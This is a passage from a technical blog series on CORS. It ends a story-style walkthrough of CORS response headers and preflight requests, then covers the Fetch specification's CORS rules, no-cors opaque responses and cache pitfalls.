create a “contact us” form, allowing potential users who are interested in their services to contact the company and let the business contact them to discuss follow-up cooperation matters. The form looks like this (although it looks a lot like Google Forms, it was made by Xiaoming himself): Xiaoming spent less than half a day to create the page and almost completed the functionality, with only one step left. Xiaoming’s supervisor told him that the company often holds some events and provides this form to everyone at the end of the event, hoping that everyone can leave their contact information through the form. Therefore, the “How did you know about our company?” on the form would like to dynamically adjust the field, adding an option of “Through the technical sharing session held on 1&#x2F;10” during the event, and removing this option about two weeks after the event ends. The reason for wanting to dynamically adjust it is that the supervisor does not want the maintenance staff to return to the development end again. If it can be made dynamic from the beginning, they can maintain it themselves through the background control in the future. So the backend created an API for Xiaoming to access and render the content into options. For testing convenience, the backend engineer first packaged the entire API service into a docker image and let Xiaoming run it on his own computer, with the URL being: http://localhost:3000. After receiving this task, Xiaoming thought about first fetching the API content to see what it was like, so he wrote this code: fetch('http://localhost:3000') Then he found an error message in the console: Xiaoming didn’t understand what it meant very well, but only noticed the last paragraph: If an opaque response serves your needs, set the request’s mode to ‘no-cors’ to fetch the resource with CORS disabled. So he added the no-cors mode to fetch: fetch('http://localhost:3000', &#123; mode: 'no-cors' &#125;).then(res => console.log(res)) After changing it, he refreshed the page and found that there were no errors, but the response printed out was particularly strange: There was no data, and the status was actually 0. Xiaoming debugged for a long time after this and couldn’t find the reason. Seeing the deadline approaching, Xiaoming gathered the courage to ask his senior, Xiaohua, for help. Xiaohua told him: This is normal. no-cors is a parameter that is easy to mislead beginners. Its meaning is not “bypass cors to get data”, but “I know it can’t pass cors, but I don’t care, so don’t give me an error or response.” You must solve this problem through the backend. Let me tell the backend for you. Xiaohua, the senior, is indeed experienced and solved Xiaoming’s problem in no time. The backend also helped to add a header: Access-Control-Allow-Origin: *, which means that the resource can be accessed by AJAX from any origin website. Backend code: app.get('/', (req, res) => &#123; res.header('Access-Control-Allow-Origin', '*') res.json(&#123; data: db.getFormOptions(), &#125;) &#125;) Xiaoming removed the mode and changed it to: fetch('http://localhost:3000') .then(res => res.json()) .then(res => console.log(res)) After opening the browser, he found that he could successfully get the options, and also saw the newly added header in the network tab: After receiving the data, all that was left was to put the options on the screen. After about half a day, Xiao Ming completed this feature and tested it, thanks to the help of his senior colleague, Xiao Hua. Day 1 Summarymode: &#39;no-cors&#39; is not what you think it is, and it cannot solve the CORS problem. When encountering a CORS problem, first check whether the backend has given you the Access-Control-Allow-Origin header. If not, please ask the backend to give it to you. Otherwise, you will not be able to pass no matter how hard you try. The value of Access-Control-Allow-Origin can be set to *, which means wildcard, and any origin is legal. It can also be set to an origin like http://huli.tw, which means only this origin is legal. If you want to bring multiple origins, sorry, there is no way, you can only give them all or give one origin. Therefore, some backends will decide the value of Access-Control-Allow-Origin in response based on the origin of the request, which we will discuss later. Day 2: Not So Simple CORSAfter a day, the supervisor told Xiao Ming that the higher-ups were not satisfied with the user experience. After submitting the form, it took one or two seconds to see the success screen, and there was no loading in between, which was not a good experience. They hoped to change the way the form was submitted to AJAX instead of page switching to improve the user experience. To cope with this change, the backend added another API: POST /form, and this time the backend automatically added the Access-Control-Allow-Origin header: app.post('/form', (req, res) => &#123; res.header('Access-Control-Allow-Origin', '*') // 省略寫到 db 的程式碼 res.json(&#123; success: true &#125;) &#125;) Xiao Ming had done something similar before, so he quickly wrote the code: document.querySelector('.contact-us-form') .addEventListener('submit', (e) => &#123; // 阻止表單送出 e.preventDefault() // 設置參數 var data = new URLSearchParams(); data.append('email', 'test@test.com') data.append('source', 'search') // 送出 request fetch('http://localhost:3000/form', &#123; method: 'POST', headers: &#123; 'Content-Type': 'application/x-www-form-urlencoded' &#125;, body: data &#125;).then(res => res.json()) .then(res => console.log(res)) &#125;) After testing, there was no problem. Just as Xiao Ming was about to report to the supervisor, the backend came over and said to Xiao Ming, “Sorry, we have made some changes recently. We will unify the use of JSON as the data format in the future, so you need to change it too. You need to send JSON instead of urlencoded data.” After hearing this, Xiao Ming thought, “This is easy, just change the data format, right?” So he changed it to this: document.querySelector('.contact-us-form') .addEventListener('submit', (e) => &#123; // 阻止表單送出 e.preventDefault() // 設置參數 var data = &#123; email: 'test@test.com', soruce: 'search' &#125; // 送出 request fetch('http://localhost:3000/form', &#123; method: 'POST', headers: &#123; 'Content-Type': 'application/json' &#125;, body: JSON.stringify(data) &#125;).then(res => res.json()) .then(res => console.log(res)) &#125;) It was just a matter of changing the data format to send data to the backend in JSON format. After the change, Xiao Ming tested it again and found that it crashed this time, and an error message appeared: Access to fetch at ‘http://localhost:3000/form‘ from origin ‘null’ has been blocked by CORS policy: Response to preflight request doesn’t pass access control check: No ‘Access-Control-Allow-Origin’ header is present on the requested resource. If an opaque response serves your needs, set the request’s mode to ‘no-cors’ to fetch the resource with CORS disabled. Switching to the network tab to see the request status, it was found that in addition to the expected POST, there was also an OPTIONS request: Xiao Ming searched for information using the keywords “preflight request” given in the error message and found that CORS was not as simple as he thought. It turned out that the requests sent before were called “simple requests”. As long as the method is GET, POST, or HEAD and no custom headers are included, and the Content-Type does not exceed application/x-www-form-urlencoded, multipart/form-data, or text/plain, it can basically be regarded as a “simple request” (more detailed definitions will be discussed in the next article). There was no error when connecting to the API at the beginning because the Content-Type was application/x-www-form-urlencoded, so it was considered a simple request. Later, when it was changed to application/json, it no longer met the definition of a simple request and became a “non-simple request”. So what happens with non-simple requests? An additional thing is sent, called a preflight request. This request is what Xiao Ming saw in the network tab as the OPTIONS request. For this request, the browser will help bring two headers: Access-Control-Request-Headers Access-Control-Request-Method For the preflight request of /form that we saw earlier, the content is: Access-Control-Request-Headers: content-type Access-Control-Request-Method: POST The former will bring headers that do not belong to simple requests, and the latter will bring HTTP Method, allowing the backend to have more information about the request that the frontend wants to send. If the backend is willing to allow it, just return an Access-Control-Allow-Origin as before. Knowing this, Xiao Ming immediately asked the backend colleague to make some changes, and the backend code became: app.post('/form', (req, res) => &#123; res.header('Access-Control-Allow-Origin', '*') res.json(&#123; success: true &#125;) &#125;) // 多加這個，讓 preflight 通過 app.options('/form', (req, res) => &#123; res.header('Access-Control-Allow-Origin', '*') res.end() &#125;) After the changes were made, Xiao Ming tried again and found that there was still an error: Access to fetch at ‘http://localhost:3000/form‘ from origin ‘null’ has been blocked by CORS policy: Request header field content-type is not allowed by Access-Control-Allow-Headers in preflight response. When your CORS request contains custom headers, the preflight response needs to explicitly use Access-Control-Allow-Headers to indicate: “I am willing to accept this header”, and the browser will judge the preflight pass. In this case, content-type belongs to a custom header, so the backend must explicitly indicate that it is willing to accept this header: app.options('/form', (req, res) => &#123; res.header('Access-Control-Allow-Origin', '*') res.header('Access-Control-Allow-Headers', 'content-type') res.end() &#125;) In this way, Xiao Ming can successfully pass the preflight request, and only after passing the preflight, the real request will be sent out. The process will be like this: We want to send a POST request to http://localhost:3000/form The browser finds that it is a non-simple request, so it first sends a preflight request Check the response, preflight passes Send the POST request to http://localhost:3000/form So if the preflight does not pass, the request of the first step will not be sent out. After experiencing a series of twists and turns, this modification was finally completed successfully. Now we can successfully submit form data in the frontend using AJAX. Summary of Day 2CORS requests are divided into two types: simple requests and non-simple requests. Regardless of which type, the backend needs to give the Access-Control-Allow-Origin header. The biggest difference is that non-simple requests will send a preflight request before sending the formal request. If the preflight does not pass, the formal request will not be sent out. For preflight requests, we must also give the Access-Control-Allow-Origin header to pass. In addition, some products may want to send some custom headers, such as X-App-Version, which carries the current version of the website, so the backend can make a record: fetch('http://localhost:3000/form', &#123; method: 'POST', headers: &#123; 'X-App-Version': \"v0.1\", 'Content-Type': 'application/json' &#125;, body: JSON.stringify(data) &#125;).then(res => res.json()) .then(res => console.log(res)) After you do this, the backend must also add Access-Control-Allow-Headers to pass the preflight: app.options('/form', (req, res) => &#123; res.header('Access-Control-Allow-Origin', '*') res.header('Access-Control-Allow-Headers', 'X-App-Version, content-type') res.end() &#125;) In short, preflight is a verification mechanism to ensure that the backend knows the request that the frontend wants to send is expected, and the browser will allow it. What I said before, “CORS request blocks response, not request”, only applies to simple requests. For non-simple requests with preflight, the request you really want to send will indeed be blocked. So why do we need a preflight request? This can be thought from two perspectives: Compatibility Security For the first point, you may have noticed that if a request is a non-simple request, you cannot make the same request using the HTML form element, and vice versa. For example, &lt;form&gt;‘s enctype does not support application/json, so this content type is a non-simple request; enctype supports multipart/form, so this content type belongs to a simple request. For those old websites that existed even before XMLHttpRequest, their backends did not expect requests with methods like DELETE or PATCH, or requests with content-type application/json, because in those days, &lt;form&gt; and &lt;img&gt; were the only elements that could send requests. There was no fetch back then, not even XMLHttpRequest. So, to prevent these backends from receiving unexpected requests, a preflight request was sent first. Since the old backends did not handle this preflight, it would not pass, and the browser would not send the actual request. This is what I mean by compatibility. By passing the preflight request, early websites are not harmed and do not receive unexpected requests. As for the second point, security, do you remember the question I asked in the first post? The one about sending a POST request to delete an article. Generally, the API for deleting would use the DELETE HTTP method. If there were no preflight request to block it, the browser would actually send this request, which could cause unexpected behavior on the backend (since it did not expect the browser to send it). That’s why a preflight request is needed, to ensure that the backend knows that the request to be sent is legal before sending the actual request. Day3: Bring on the CookieYesterday’s version was highly praised by the upper management, and the supervisor even treated Xiao Ming and Xiao Hua to a celebratory drink. However, just as they were happy, the marketing department came and asked, “Why aren’t these requests carrying cookies? We need the user’s cookies for analysis. Please bring these cookies.” It was then that Xiao Ming suddenly remembered, “Oh yeah, cross-origin requests don’t carry cookies by default.” After checking MDN, he found that as long as he added credentials: &#39;include&#39;, it should work: fetch('http://localhost:3000/form', &#123; method: 'POST', credentials: 'include', // 新增這個 headers: &#123; 'Content-Type': 'application/json' &#125;, body: JSON.stringify(data) &#125;).then(res => res.json()) .then(res => console.log(res)) But unexpectedly, there was an error message on the frontend: Access to fetch at ‘http://localhost:3000/form‘ from origin ‘http://localhost:8080‘ has been blocked by CORS policy: Response to preflight request doesn’t pass access control check: The value of the ‘Access-Control-Allow-Origin’ header in the response must not be the wildcard ‘*’ when the request’s credentials mode is ‘include’. The error message actually explains it very clearly. If you want to carry cookies, Access-Control-Allow-Origin cannot be *, and the origin must be explicitly specified. Why is that? Because if there were no such restrictions, any website (any origin) could send requests to this API and carry the user’s cookies, which would create security issues, similar to CSRF. Therefore, for security reasons, if you want to carry cookies, the backend must explicitly specify which origin has permission. In addition, the backend must also include the Access-Control-Allow-Credentials: true header. So Xiao Ming asked Xiao Hua to modify the backend again: const VALID_ORIGIN = 'http://localhost:8080' app.post('/form', (req, res) => &#123; res.header('Access-Control-Allow-Origin', VALID_ORIGIN) // 明確指定 res.header('Access-Control-Allow-Credentials', true) // 新增這個 res.json(&#123; success: true &#125;) &#125;) app.options('/form', (req, res) => &#123; res.header('Access-Control-Allow-Origin', VALID_ORIGIN) // 明確指定 res.header('Access-Control-Allow-Credentials', true) // 新增這個 res.header('Access-Control-Allow-Headers', 'content-type, X-App-Version') res.end() &#125;) After the modification, the version explicitly specifies that only http://localhost:8080 has permission to access the CORS Response, and adds the Access-Control-Allow-Credentials header. With this, everything is done, and cookies can be successfully carried when sending requests. The marketing department’s requirements are also met, yay! Day3 SummaryIf you need to carry cookies when sending requests, you must meet three conditions: The backend Response header has Access-Control-Allow-Credentials: true The Access-Control-Allow-Origin in the backend Response header cannot be *, it must be explicitly specified The front-end fetch adds credentials: &#39;include&#39; If any of these three conditions are not met, the cookie cannot be carried. In addition to this, there is one more thing to pay special attention to, which is not only to carry cookies, but also to set cookies. The backend can use the Set-Cookie header to let the browser set cookies, but the above three conditions must also be met. If these three conditions are not met at the same time, even if there is a Set-Cookie header, the browser will not set it, which should be noted. In fact, whether you want to access cookies or not, it is recommended that Access-Control-Allow-Origin should not be set to *, but explicitly specify the origin to avoid unexpected cross-site access to resources. If you have multiple origins, it is recommended to have a list of origins on the backend, and determine whether the origin in the request header is in the list. If it is, set Access-Control-Allow-Origin, otherwise ignore it. Day4: Accessing Custom HeadersDo you remember the API we connected to the backend at the beginning? The API for getting options. Although we have successfully completed it before, unexpectedly, a new requirement was added this morning. This requirement is to version control the content of this API. The backend will add a header X-List-Version to the response header to let the frontend know which version the option list is. The frontend needs to get this version and put the value into the form to submit it together. The backend looks like this: app.get('/', (req, res) => &#123; res.header('Access-Control-Allow-Origin', '*') res.header('X-List-Version', '1.3') res.json(&#123; data: [ &#123;name: '1/10 活動', id: 1&#125;, &#123;name: '2/14 特別活動', id: 2&#125; ] &#125;) &#125;) Since the content of this API is public, it is okay to use a wildcard without allowing specific origins. Xiaoming modified the code before and tried to print out the header first: fetch('http://localhost:3000') .then(res => &#123; console.log(res.headers.get('X-List-Version')) return res.json() &#125;) .then(res => console.log(res)) At this time, a magical thing happened. Although we can see the response header we want from the network tab, we cannot get it in the program and output null. Xiaoming checked it several times, confirmed that there were no typos, and there were no error messages, but he still couldn’t get it. After being stuck for an hour, Xiaoming decided to ask his senior colleague Xiaohua for help again. Xiaohua, as a senior colleague, said after seeing this situation: If you want to access the header of the CORS response, especially custom headers, the backend needs to bring an Access-Control-Expose-Headers header, so that the frontend can get it. “Oh, that’s how it is!” Xiaoming suddenly realized and went to find his backend colleague to add this header: app.get('/', (req, res) => &#123; res.header('Access-Control-Allow-Origin', '*') res.header('Access-Control-Expose-Headers', 'X-List-Version') // 加這個 res.header('X-List-Version', '1.3') res.json(&#123; data: [ &#123;name: '1/10 活動', id: 1&#125;, &#123;name: '2/14 特別活動', id: 2&#125; ] &#125;) &#125;) After the modification, Xiaoming tested it again and found that he could indeed get the header correctly! Thank Xiaohua, praise Xiaohua, and another peaceful day passed. Day4 SummaryWhen you get a cross-origin response, you can basically get the response body, that is, the content. But the header is different. Only a few basic headers can be obtained directly, such as Content-Type. In addition, if you want to get other headers, especially custom headers, the backend needs to bring Access-Control-Expose-Headers, so that the browser knows: “I am willing to expose this header to let JS see it”, so that the frontend can successfully grab the header. If it is not added, null will be obtained, just like this header does not exist. Day5: Editing DataXiaoming, who thought everything was going smoothly, hit a snag again. This time it was a requirement raised by the boss. Now, once the form is submitted, there is no chance to change it. If the user realizes that there is a mistake in filling in somewhere, they can only fill it in again. The boss thinks that this experience is not good and hopes that there is a chance to edit the form just submitted after the user submits the form. After discussing with the backend, the backend will give a token after submitting the form. The frontend only needs to bring this token to call the PATCH /form API to edit the content of the form just submitted. The backend looks like this, and all the headers that need to be added are added: const VALID_ORIGIN = 'http://localhost:8080' app.patch('/form', (req, res) => &#123; res.header('Access-Control-Allow-Origin', VALID_ORIGIN) res.header('Access-Control-Allow-Credentials', true) // 省略編輯的部分 res.json(&#123; success: true &#125;) &#125;) app.options('/form', (req, res) => &#123; res.header('Access-Control-Allow-Origin', VALID_ORIGIN) res.header('Access-Control-Allow-Credentials', true) res.header('Access-Control-Allow-Headers', 'content-type, X-App-Version') res.end() &#125;) Xiaoming immediately started working on the frontend part, which looks like this: fetch('http://localhost:3000/form', &#123; method: 'PATCH', credentials: 'include', headers: &#123; 'X-App-Version': \"v0.1\", 'Content-Type': 'application/json' &#125;, body: JSON.stringify(&#123; token: 'test_token', content: 'new content' &#125;) &#125;).then(res => res.json()) .then(res => console.log(res)) In fact, it is similar to the code for submitting the form before, with only minor differences in the body and method. However, when Xiaoming tested it, the browser reported an error again: Access to fetch at ‘http://localhost:3000/form‘ from origin ‘http://localhost:8080‘ has been blocked by CORS policy: Method PATCH is not allowed by Access-Control-Allow-Methods in preflight response. Cross-origin requests only accept three HTTP methods: GET, HEAD, and POST. If any other methods are used, the backend must return an Access-Control-Allow-Methods header to specify which methods are allowed. Therefore, the backend needs to be modified as follows: // preflight app.options('/form', (req, res) => &#123; res.header('Access-Control-Allow-Origin', VALID_ORIGIN) res.header('Access-Control-Allow-Credentials', true) res.header('Access-Control-Allow-Methods', 'PATCH') // 多這個 res.header('Access-Control-Allow-Headers', 'content-type, X-App-Version') res.end() &#125;) This way, the browser knows that the frontend can use the PATCH method and will not block subsequent requests. Summary of Day 5If the frontend needs to send a request using an HTTP method other than GET, HEAD, or POST, the backend’s preflight response header must have Access-Control-Allow-Methods and specify the valid methods. Only then will the preflight pass and the browser send the actual request. This is similar to Access-Control-Allow-Headers mentioned earlier, except that one specifies which methods can be used, while the other specifies which request headers can be used. Day 6: Caching preflight requestsJust when they thought they had solved all the cross-origin issues, a problem arose on the technical side just before going live. During QA’s stress testing of the website, they found that there were too many preflight requests, and even if the same user had already preflighted, it still needed to be checked every time, which was quite wasteful in terms of performance. So QA asked the backend to cache this so that if the same browser sent the request repeatedly, it would not need to preflight again. Although Xiao Ming is a frontend developer, he wants to become a CORS expert. So he worked with the backend to figure out how to solve this problem. They found a header: Access-Control-Max-Age, which tells the browser how many seconds the preflight response can be cached. Then the backend added this header: app.options('/form', (req, res) => &#123; res.header('Access-Control-Allow-Origin', VALID_ORIGIN) res.header('Access-Control-Allow-Credentials', true) res.header('Access-Control-Allow-Headers', 'content-type, X-App-Version') res.header('Access-Control-Max-Age', 300) res.end() &#125;) This way, the preflight response will be cached by the browser for 300 seconds, and within those 300 seconds, the same resource will not be preflighted again, but the cached data will be used directly. SummaryLet’s review all the headers that appeared in the story. At first, Xiao Ming needed to access the cross-origin request’s response, so the backend needed to provide Access-Control-Allow-Origin to prove that this origin has permission. Then, because custom headers needed to be sent, the backend needed to provide Access-Control-Allow-Headers to specify which headers the client can send. At the same time, because there were more preflight requests, the backend needed to handle the OPTIONS request. Then we needed to use cookies, so Access-Control-Allow-Origin cannot be * and must be changed to a single origin. The backend also needs to provide Access-Control-Allow-Credentials: true. Next, if the frontend needs to access headers, the backend must provide Access-Control-Expose-Headers to tell the browser which headers the frontend can access. If the frontend needs to use methods other than HEAD, GET, and POST, the backend must add Access-Control-Allow-Methods. Regarding caching, use Access-Control-Max-Age. Looking at the whole story, you will find that there is actually not much for the frontend to do. The role of the frontend in the whole story is: write code &#x3D;&gt; find errors &#x3D;&gt; report to the backend &#x3D;&gt; backend fixes &#x3D;&gt; complete the function. This also echoes what I have repeatedly emphasized before: “CORS issues are usually not something that the frontend can solve.” In short, CORS uses a bunch of response headers to tell the browser what the frontend has permission to access. Without these headers provided by the backend, the frontend can’t do anything. Therefore, both the frontend and the backend need to know these headers so that they can solve related problems in the future. By the way, I think Chrome’s error messages are getting better and better. I remember they weren’t as detailed before, but now they are so detailed that you can even see the error message directly without Googling how to fix it. I hope that through this article, everyone can understand which response headers CORS has and what preflight requests are and when they are triggered. After understanding these, you probably have about 80% understanding of the entire CORS protocol. In the next article, CORS Complete Manual (Part 4): Let’s Look at the Specification Together, we will look at the specification together to further understand the CORS protocol.","link":"/2021/02/19/en/cors-guide-3/"},{"title":"CORS Complete Guide (Part 4): Understanding the Specification","text":"IntroductionAfter acquiring knowledge, how can you determine whether it is correct or not? In the field of programming, this is actually a relatively simple question. You just need to check how the specification is written (if there is one). For example, various language features of JavaScript can be found in the ECMAScript Specification. Why [] === [] is false, why &#39;b&#39; + &#39;a&#39; + + &#39;a&#39; + &#39;a&#39; is baNaNa, all of these are explained in detail in the specification, using what rules to perform the conversion. In addition to JS, almost all HTML or other related specifications in the Web field can be found on w3.org or whatwg.org, and the resources are quite rich. Although the implementation of browsers may be different from what is written in the specification (such as this article), the spec is the most complete and authoritative place, so it is correct to come here to find information. If you search for the CORS spec, you may find RFC6454 - The Web Origin Concept and W3C’s Cross-Origin Resource Sharing, but these two have been replaced by a document called Fetch. At first, I was puzzled and thought I had read it wrong. What is the relationship between fetch and CORS? Later, I learned that the fetch here is different from the fetch in the Web API. This specification defines everything related to “fetching data”, as written in its outline: The Fetch standard defines requests, responses, and the process that binds them: fetching. In this article, let’s take a look at the CORS-related specifications together, proving that what I said in the previous articles is not nonsense, but based on facts. Since the specification is quite long, I will only pick some key points that I think are important. If you want to understand all the content of the specification, you still need to read it yourself. (The version of the specification referred to when this article was published is: Living Standard — Last Updated 15 February 2021. For the latest specification, please refer to: Fetch) Let’s start with something simpleSpecifications are very complete, so the content is extensive and messy. If you don’t start with something simple, it’s easy to get discouraged. The simplest part is the Goals and Preface at the beginning, which state: The goal is to unify fetching across the web platform and provide consistent handling of everything that involves, including: URL schemes Redirects Cross-origin semantics CSP Service workers Mixed Content Referer To do so it also supersedes the HTTP Origin header semantics originally defined in The Web Origin Concept This specification integrates everything related to “fetching”, including what we are most concerned about, CORS or other related operations. It also mentions that this specification supersedes the original RFC6454 - The Web Origin Concept. Then, the preface states: At a high level, fetching a resource is a fairly simple operation. A request goes in, a response comes out. The details of that operation are however quite involved and used to not be written down carefully and differ from one API to the next. Fetching data may seem simple, just send a request and receive a response, but in reality, it is quite complex. The lack of a standardized specification has led to inconsistent implementations of each API. This is why the Fetch Standard was created, to provide a unified architecture for fetching resources, such as images, scripts, and CSS, and to manage these behaviors. The Fetch Standard also defines the fetch() JavaScript API, which exposes most of the networking functionality at a low level of abstraction. The definition of Origin is provided in section 3.1 of the Origin header, which includes an ABNF rule. The content of Origin can only be one of two types: &quot;null&quot; or a combination of scheme, host, and port. It is important to note the difference between the new and old specifications. In the old specification, Origin could be a list, but in the new specification, it is limited to one. In any case, the definition of Origin is a combination of scheme, host, and port. Moving on to CORS, it is introduced in section 3.2 of the CORS protocol. The introduction is crucial, as the CORS protocol exists to allow sharing responses cross-origin and to enable more versatile fetches than possible with HTML’s form element. It is layered on top of HTTP and allows responses to declare that they can be shared with other origins. The CORS protocol needs to be an opt-in mechanism to prevent data leakage from responses behind a firewall (intranets). Additionally, for requests including credentials, it needs to be opt-in to prevent the leakage of potentially sensitive data. Next, the following paragraph in section 3.2.1 General is also important: The CORS protocol consists of a set of headers that indicates whether a response can be shared cross-origin. For requests that are more involved than what is possible with HTML’s form element, a CORS-preflight request is performed, to ensure request’s current URL supports the CORS protocol. There are two key points mentioned here. The first is that CORS determines whether a response can be shared cross-origin through headers. This is what I mentioned in the previous article: In short, CORS uses a set of response headers to tell the browser which resources the front-end has permission to access. The second point is that if a request is more complex than what can be expressed with an HTML form element, a CORS-preflight request will be made. So what does it mean to be “more complex than what can be expressed with an HTML form element”? We’ll look at that later, but first let’s look at these two sections: 3.2.2. HTTP requests A CORS request is an HTTP request that includes an Origin header. It cannot be reliably identified as participating in the CORS protocol as the Origin header is also included for all requests whose method is neither GET nor HEAD. This is quite special. If I understand correctly, it means that an HTTP request is called a CORS request if it contains the Origin header. However, this does not mean that the request is related to the CORS protocol, as the Origin header is also included for all requests whose method is neither GET nor HEAD. To verify this behavior, I created a simple form: &lt;form action=\"/test\" method=\"POST\"> &lt;input name=\"a\" /> &lt;input type=\"submit\" /> &lt;/form> Then I tried both POST and GET methods, and found that this is indeed the case. The GET request did not include the Origin header, but the POST request did. So according to the specification, submitting data with a form POST to the same origin is also called a CORS request. Strange knowledge has increased again. A CORS-preflight request is a CORS request that checks to see if the CORS protocol is understood. It uses OPTIONS as method and includes these headers: Access-Control-Request-MethodIndicates which method a future CORS request to the same resource might use. Access-Control-Request-HeadersIndicates which headers a future CORS request to the same resource might use. A CORS-preflight request uses OPTIONS as the method to check whether the server understands the CORS protocol. One thing to note here is that, as stated on MDN: Some requests do not trigger a CORS preflight. These are called “simple requests” in this article, although the Fetch standard (which defines CORS) does not use this term. The Fetch specification does not use the term “simple request” to distinguish whether a request will trigger a CORS-preflight request. The preflight request in the CORS protocol includes these two headers: Access-Control-Request-Method Access-Control-Request-Headers to indicate the method and headers that may be used in the subsequent CORS request, as we mentioned in the previous article. Moving on to the section about responses: 3.2.3. HTTP responses An HTTP response to a CORS request can include the following headers: Access-Control-Allow-OriginIndicates whether the response can be shared, via returning the literal value of the Origin request header (which can be null) or * in a response. Access-Control-Allow-CredentialsIndicates whether the response can be shared when request’s credentials mode is “include”. These two headers are for CORS requests and were already mentioned in the previous article. The former is used to determine which origins are allowed, while the latter determines whether cookies can be sent and received. An HTTP response to a CORS-preflight request can include the following headers: Access-Control-Allow-MethodsIndicates which methods are supported by the response’s URL for the purposes of the CORS protocol. Access-Control-Allow-HeadersIndicates which headers are supported by the response’s URL for the purposes of the CORS protocol. Access-Control-Max-AgeIndicates the number of seconds (5 by default) the information provided by the Access-Control-Allow-Methods and Access-Control-Allow-Headers headers can be cached. CORS-preflight requests are a type of CORS request, so the response headers mentioned above for CORS requests can also be used for CORS-preflight requests. In addition, three more headers are defined: Access-Control-Allow-Methods: which methods can be used Access-Control-Allow-Headers: which headers can be used Access-Control-Max-Age: how long the first two headers can be cached It’s worth noting the third header, which has a default value of 5 seconds. This means that CORS response headers for the same resource can be reused within 5 seconds. An HTTP response to a CORS request that is not a CORS-preflight request can also include the following header: Access-Control-Expose-HeadersIndicates which headers can be exposed as part of the response by listing their names. For non-preflight CORS requests, the Access-Control-Expose-Headers header can be provided to specify which headers can be accessed. If not specified, even if the response is obtained, the header cannot be accessed. Now let’s go back to the question mentioned earlier: “What triggers a preflight request?” Preflight requestThe rules for fetching resources are described in detail in section 4.1. Main fetch. We are interested in point 5: request’s use-CORS-preflight flag is setrequest’s unsafe-request flag is set and either request’s method is not a CORS-safelisted method or CORS-unsafe request-header names with request’s header list is not empty Set request’s response tainting to “cors”. Let corsWithPreflightResponse be the result of performing an HTTP fetch using request with the CORS-preflight flag set. If corsWithPreflightResponse is a network error, then clear cache entries using request. Return corsWithPreflightResponse. If the method of the request is not a CORS-safelisted method or if the header contains CORS-unsafe request-header names, the CORS-preflight flag will be set and an HTTP fetch will be performed. Continuing down the line, in the HTTP fetch process, it will be determined whether this flag has been set, and if so, a CORS-preflight fetch will be performed. All of the above can be found in the spec: 2.2.1 Methods A CORS-safelisted method is a method that is GET, HEAD, or POST. Only these three methods will not trigger a preflight. As for CORS-unsafe request-header names, it will check whether the headers are all “CORS-safelisted request-header”. The definition of this can be found in section 2.2.2. Headers, and basically only the following will pass: accept accept-language content-language content-type However, it should be noted that content-type has additional conditions and can only be: application&#x2F;x-www-form-urlencoded multipart&#x2F;form-data text&#x2F;plain The corresponding value of the above headers must also be valid characters. The definition of what constitutes valid characters varies for each header, so we won’t go into detail here. If the request exceeds this range when sent, a preflight request will be sent. Therefore, if you want to send JSON format data with a POST request, it will also trigger a preflight request, unless you use text&#x2F;plain as the content-type (but it is not recommended to do so). CORS checkRegarding the request part, we should have finished reading it. Next, let’s take a look at the response-related part. There is one thing I am curious about, which is how to verify that the CORS result has passed. This can be seen in section 4.10. CORS check: If the origin in Access-Control-Allow-Origin is null, it fails (it is emphasized here that it is null, not “null”, which we will discuss later). Next, if the origin is * and the credentials mode is not include, it will pass. Then compare the origin of the request with the one in the header. If they are different, it will return a failure. If the origin is the same at this point, check the credentials mode again. If it is not include, it will pass. Otherwise, check Access-Control-Allow-Credentials. If it is true, it will pass; otherwise, it will return a failure. This series of checks has an early return flavor, which may be because it is easier to write in a list format and try to flatten the nesting as much as possible. The above is almost all the specifications related to CORS. Chapter 6 mainly talks about the fetch API, and Chapter 7 talks about websockets. Next, let’s focus on some other important content. Misleading no-cors mode and fetch processAs mentioned earlier, fetch can set a mode: no-cors. Next, let’s take a look at what it actually does from the perspective of the specification. Because this is a parameter of the fetch request, we need to start with 5.4 Request class, where there is a paragraph: The new Request(input, init) constructor steps are: In step 30, you can see: If the request method is not GET, HEAD, or POST, a TypeError will be thrown. In addition, the header&#39;s guard will also be set to request-no-cors. The above is just creating a new request. Next, you can refer to 5.6. Fetch method to see the actual process of sending the request: The previous steps were just setting some parameters. The real action is in step ten: Fetch request with processResponse given response being these substeps That “Fetch” is a hyperlink that can be linked to the section 4. Fetching, and what we are concerned about here is the last step: Run main fetch given fetchParams. Main fetch is also a hyperlink that will take you to 4.1. Main fetch, where there is a whole section dedicated to handling the case when the mode is no-cors: There are several things worth noting here: In step two, the response tainting of the request is set to opaque. In step three, the “scheme fetch” is executed. In step five, a new response is created with only status and CSP list. The warning below. You can continue to trace back to the scheme fetch, just like before, and then follow different fetch methods, and the deeper you go, the more complicated it becomes. However, I have already traced it for you here, so assuming that step four is not valid, it will execute step five: “Return a new response whose status is noCorsResponse’s status, and CSP list is noCorsResponse’s CSP list.” The warning part is actually quite important: This is only an effective defense against side channel attacks if noCorsResponse is kept isolated from the process that initiated the request. The reason for creating a new response here is that we don’t want to return the original response, we want to separate the original response from the process that initiated this request. Why do we do this? We will discuss this in the next article. Next, let’s continue to look down, and you can see step fourteen: The response tainting has been set to opaque, so according to step two, the response is set to opaque filtered response. So what is this opaque filtered response? An opaque filtered response is a filtered response whose type is “opaque”, URL list is the empty list, status is 0, status message is the empty byte sequence, header list is empty, and body is null. This is the response we got when we used mode: &#39;no-cors&#39;, with a status of 0, no header, and no body. In the specification, we have confirmed what I said earlier, that once the mode is set to no-cors, you cannot get the response, even if the backend sets the header. Precautions when using CORS and cacheThere is a paragraph in the specification: CORS protocol and HTTP caches that specifically discusses this. Assume a scenario where the server only responds to requests with an origin header with the Access-Control-Allow-Origin header, and does not respond if there is no origin header (Amazon S3 does this). Then this response is cached, so the browser caches it. Then let’s say we want to display an image, which is on S3, so it is cross-origin. We put &lt;img src=&quot;https://s3.xxx.com/a.png&quot;&gt; on the page, and the browser loads the image and caches the response. Because it is an img tag, the browser does not send an origin header, so the response naturally does not have Access-Control-Allow-Origin. But then we also need to get this image in JS, so we use fetch to get it: fetch(&#39;https://s3.xxx.com/a.png&#39;). At this point, it becomes a CORS request, so the request header will include the origin. However, since we have already cached the response of this URL earlier, the browser will directly use the cached response that has not yet expired. This is where the tragedy happens. The cached response we had earlier does not have the Access-Control-Allow-Origin header, so the CORS verification fails, and we cannot get the content of the image. So how do we solve this situation? In the HTTP response header, there is a Vary that determines that the cache of this response may be different from some request headers. For example, if Vary: Origin is passed, it means that if the origin header in the request I send later is different, then the previous cache should not be used. In the case mentioned earlier, after setting this header, the request we send using fetch should not use the previously cached response because the Origin header is different from the one used with img earlier. Instead, it should send a new request. I actually encountered this problem myself… please refer to: CORS is not as simple as I thought. ConclusionIn this article, we looked at the fetch spec and 